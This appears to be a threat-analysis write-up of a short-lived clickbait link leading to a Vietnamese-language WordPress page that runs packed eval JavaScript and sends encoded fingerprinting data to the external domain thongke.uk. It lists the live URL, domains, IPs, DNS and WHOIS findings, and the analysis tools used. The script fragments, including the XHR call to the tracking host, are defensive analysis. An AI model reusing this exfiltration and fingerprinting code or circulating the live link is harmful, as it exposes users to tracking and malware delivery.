# Self-Destructing-JS-Redirect-Trap-Analysis-April-2025-

## 🎯 Overview
This document details the analysis of a suspicious link that appeared briefly online (~15 minutes) and was manually deleted by the individual who posted it. The link led to a webpage hosted under a seemingly benign domain, but its behavior revealed obfuscated JavaScript, external data exfiltration, and redirection behavior consistent with black hat campaigns.

## 🕵️‍♂️ Investigated URL
```
http://cokokikikco.alexanderpollard.com/XbPuBCUFRFeMxjfd
```

## 📌 DNS & Host Info
- **Subdomain:** `cokokikikco`
- **Domain:** `alexanderpollard.com`
- **Resolved IPs:**
  - `172.67.188.98` (Cloudflare)
  - `104.21.40.213` (Cloudflare)

> The server is hidden behind Cloudflare, common for either protection or obfuscation.

## 📃 HTML Snapshot
- `<title>HOT Video 1,356,198 views</title>` — clickbait headline
- Meta tags in Vietnamese, implying traffic targeting Southeast Asia
- `og:image` points to a Googleusercontent-hosted image
- Generated by **WordPress 5.8.4** using **Site Kit by Google** plugin

---

## 🔬 JavaScript Behavior
### 🔸 Ofuscated Script
```js
eval(function(p,a,c,k,e,r){...})
```
- Uses Dean Edwards-style packing
- Calls to `XMLHttpRequest`, `navigator`, `window.location`

### 🔸 Remote GET Request
```js
xhr.open("GET", window.location.protocol + "//thongke.uk?s=Y29rb2tpca2lrY29BYWxleGFuZGVyC9sbGFyZC5jb21BMT...");
```
- Sends encoded data to `thongke.uk`
- Behavior suggests **fingerprinting** or **redirection campaign tracking**

---

## 🌐 Secondary Domain Info: `thongke.uk`
- **WHOIS:** Registered Aug 2023, privacy protected
- **Resolved IPs:**
  - `172.67.167.71`
  - `104.21.11.215`
- **Also protected by Cloudflare**

---

## 🧪 Tools Used for Analysis
- `curl -I` for HTTP headers
- `dig`, `whois`, `nslookup` for DNS enumeration
- Manual `curl` of HTML page + `cat`/`grep` inspection
- JavaScript beautification tools
- Optional proxy interception using Burp Suite (recommended)

---

## 💣 Key Indicators of Suspicion
- Ofuscated script with runtime execution (`eval`)
- Encoded fingerprinting redirect to external domain
- Rapid deletion of the link post (indicating manual control by attacker)
- Short TTL of post: ~15 minutes live before removal

---

## 🧾 Conclusion
This case appears to be a **temporary malicious redirect campaign**, potentially under A/B testing by the attacker. The use of clickbait elements, rapid self-removal, and ofuscated tracking scripts aligns with modern techniques for:
- Black hat affiliate redirection
- Fingerprint harvesting
- Early-stage malware delivery testing

The subdomain being under a legit-looking domain (possibly compromised WordPress site) adds to the danger, as users may trust the link at a glance.
